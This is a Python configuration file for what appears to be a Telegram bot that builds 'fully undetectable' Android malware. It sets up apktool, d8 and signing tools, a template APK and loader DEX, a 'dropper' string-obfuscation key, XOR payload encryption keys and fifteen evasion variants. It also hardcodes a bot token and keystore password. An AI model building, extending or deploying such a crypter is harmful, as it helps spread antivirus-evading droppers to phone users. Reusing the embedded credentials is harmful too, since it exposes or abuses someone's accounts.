import os

BOT_TOKEN = "8902950524:AAFxUFbICKx4sm5JM-WGudYOSfjR3w59_Dk"

_HOME = os.path.expanduser("~")
_HERE = os.path.dirname(os.path.abspath(__file__))
TOOLS_DIR = os.path.join(_HOME, "tools")

JAVA_BIN      = os.path.join(TOOLS_DIR, "jre", "bin", "java")
JAVAC_BIN     = os.path.join(TOOLS_DIR, "jre", "bin", "javac")
APKTOOL_JAR   = os.path.join(TOOLS_DIR, "apktool.jar")
BT_DIR        = os.path.join(TOOLS_DIR, "build-tools")
APKSIGNER_BIN = os.path.join(BT_DIR, "apksigner")
ZIPALIGN_BIN  = os.path.join(BT_DIR, "zipalign")
D8_BIN        = os.path.join(BT_DIR, "d8")

KEYSTORE_DIR  = os.path.join(TOOLS_DIR, "keystores")
KEYSTORE_PATH = os.path.join(KEYSTORE_DIR, "default.p12")
KEYSTORE_PASS = "fudbot123"
KEY_ALIAS     = "androidkey"

TEMPLATE_APK  = os.path.join(_HERE, "template.apk")
VARIANTS_DIR  = os.path.join(TOOLS_DIR, "variants")

WORK_DIR = os.path.join(_HOME, "fud_workspace")

LOADER_SRC_DIR = os.path.join(_HERE, "loader_src")
LOADER_DEX     = os.path.join(TOOLS_DIR, "loader.dex")

ANDROID_JAR = os.path.join(TOOLS_DIR, "android.jar")

PAYLOAD_XOR_KEY = bytes([
    0xF1, 0x79, 0x78, 0x72, 0xAC, 0x69, 0x3E, 0xAA,
    0xB1, 0xA6, 0x4F, 0xB7, 0xF2, 0xC6, 0x30, 0x02,
    0x8D, 0x4C, 0x1A, 0xE3, 0x7F, 0x92, 0xD5, 0x6B,
    0x2C, 0x48, 0x9E, 0x11, 0x73, 0xFA, 0x05, 0xB8,
])

# String obfuscation key (template DEX ke andar)
STRING_XOR_KEY = "K3y_Dr0pp3r_V5_XoR_2025"

# tools_encrypt.py ke liye — alag scheme
PAYLOAD_KEY1 = bytes([
    0x5A, 0x1C, 0x3E, 0x7B, 0x92, 0x44, 0xAF, 0x08,
    0xD1, 0x66, 0x22, 0x9F, 0x0B, 0x35, 0xC7, 0x84,
])
PAYLOAD_KEY2 = bytes([
    0xE7, 0x23, 0x91, 0x4C, 0xB5, 0x18, 0x6A, 0xDF,
    0x02, 0x77, 0x3B, 0xCE, 0x59, 0xA4, 0x10, 0x8D,
])
PAYLOAD_ROT = 3

VARIANT_COUNT = 15

URL_JRE         = "https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.11%2B9/OpenJDK17U-jdk_x64_linux_hotspot_17.0.11_9.tar.gz"
URL_APKTOOL     = "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
URL_BUILDTOOLS  = "https://dl.google.com/android/repository/build-tools_r34-linux.zip"
URL_ANDROID_JAR = "https://repo1.maven.org/maven2/com/google/android/android/4.1.1.4/android-4.1.1.4.jar"
